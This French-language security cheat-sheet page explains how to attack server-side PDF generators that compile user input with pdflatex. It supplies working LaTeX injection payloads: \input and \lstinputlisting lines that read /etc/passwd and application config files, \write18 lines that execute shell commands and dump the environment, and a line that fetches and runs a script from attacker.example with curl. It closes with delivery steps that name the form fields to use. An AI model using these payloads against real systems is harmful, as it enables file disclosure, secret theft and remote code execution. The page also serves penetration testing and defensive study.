---
title: "Injection LaTeX dans les pipelines PDF"
description: "Des champs contrôlés par l'attaquant compilés par un moteur TeX côté serveur permettent la lecture de fichiers via \\input et l'exécution de commandes shell via \\write18 lorsque shell-escape est activé."
keywords:
  - injection latex
  - injection tex
  - pdflatex
  - write18
  - shell-escape
  - input
---

# LaTeX

Les applications qui construisent des PDF en compilant un modèle TeX avec `pdflatex` (factures, certificats, rapports) insèrent souvent les champs utilisateur directement dans le source. Comme TeX est un langage de macros complet, un champ non échappé devient du balisage exécutable : divulgation de fichiers via les primitives d'inclusion et, lorsque shell-escape est activé, exécution de commandes du système d'exploitation.

## Le sink

Un modèle interpole une valeur sans aucun échappement :

```latex
\documentclass{article}
\begin{document}
Hello, USERNAME_HERE
\end{document}
```

Tout ce que vous soumettez pour le nom d'utilisateur est compilé en tant que TeX, de sorte que les séquences de contrôle qu'il contient s'exécutent.

## Lecture des fichiers du serveur

`\input` et `\include` insèrent le contenu d'un autre fichier dans le document, qui est ensuite rendu dans le PDF de sortie :

```latex
\input{/etc/passwd}
\input{/etc/hostname}
```

`\lstinputlisting` (du paquet `listings`) reproduit un fichier verbatim, en préservant la mise en forme que `\input` dégrade :

```latex
\lstinputlisting{/etc/passwd}
\lstinputlisting{/var/www/app/config.php}
```

`\include` et le couple de plus bas niveau `\openin`/`\read` obtiennent la même divulgation lorsque ces paquets ou primitives sont disponibles :

```latex
\newread\f
\openin\f=/etc/passwd
\read\f to \line
\line
\closein\f
```

## Exécution de commandes avec shell-escape

`\write18` exécute une commande shell lorsque le moteur est invoqué avec `-shell-escape` (ou `shell_escape = t` dans la configuration). De nombreux pipelines serveur l'activent pour la génération de diagrammes ou d'images, ce qui est tout ce dont l'attaquant a besoin :

```latex
\immediate\write18{id}
\immediate\write18{id > /tmp/o; }\input{/tmp/o}
```

La seconde forme capture la sortie de la commande dans le PDF en écrivant dans un fichier puis en l'incluant. Une prise de contrôle plus complète récupère et exécute un payload :

```latex
\immediate\write18{curl http://attacker.example/s.sh|sh}
```

Même en mode shell-escape restreint, des assistants figurant sur une liste d'autorisation comme `\write18{bibtex ...}` ou les hooks de conversion d'images peuvent parfois être détournés pour exécuter des binaires arbitraires.

## Abus de macros pour l'exfiltration

Au-delà des inclusions, les primitives TeX lisent l'environnement et le système de fichiers dans des macros que vous pouvez rendre ou écrire. `\input` sur un pipe, et l'`\immediate\write` de valeurs récoltées vers un fichier accessible à l'attaquant pendant la compilation, transforment l'hôte de build en point d'exfiltration :

```latex
\immediate\write18{env > /tmp/e}
\input{/tmp/e}
```

Les vecteurs propres aux paquets élargissent la surface : `\usepackage{verbatim}` avec `\verbatiminput`, les astuces `\catcode` pour réactiver des caractères désactivés, et `\InputIfFileExists` pour sonder l'existence de fichiers avant de les lire.

## Livraison

Soumettez le payload via le champ que le modèle rend (nom, adresse, ligne de facture, bio de profil). L'attaque se déclenche côté serveur dès que l'application exécute `pdflatex`, de sorte que le PDF de sortie, ou une erreur de compilation divulguant le contenu d'un fichier, vous est renvoyé ou stocké pour récupération ultérieure.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour soumettre des payloads de macros TeX.
- Payloads `\input` et `\write18` manuels compilés par le moteur cible.

## Références

- [OWASP Testing Guide: server-side injection](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: LaTeX Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)
